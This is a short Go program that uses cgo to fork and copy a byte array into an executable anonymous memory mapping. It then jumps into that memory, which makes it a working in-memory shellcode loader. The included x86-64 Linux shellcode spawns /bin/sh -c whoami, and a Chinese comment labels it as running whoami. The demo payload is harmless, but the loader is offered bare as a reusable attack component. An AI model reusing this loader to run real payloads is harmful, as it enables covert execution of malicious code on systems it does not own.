package main

/*
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
void call(char *shellcode, size_t length) {
	if(fork()) {
		return;
	}
	unsigned char *ptr;
	ptr = (unsigned char *) mmap(0, length, \
		PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if(ptr == MAP_FAILED) {
		perror("mmap");
		return;
	}
	memcpy(ptr, shellcode, length);
	( *(void(*) ()) ptr)();
}
*/
import "C"
import (
	"unsafe"
)

func Run(sc []byte) {
	C.call((*C.char)(unsafe.Pointer(&sc[0])), (C.size_t)(len(sc)))
}


func main() {
	//执行命令whoami
	sc := []byte("\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f\x05")
	Run(sc)
}
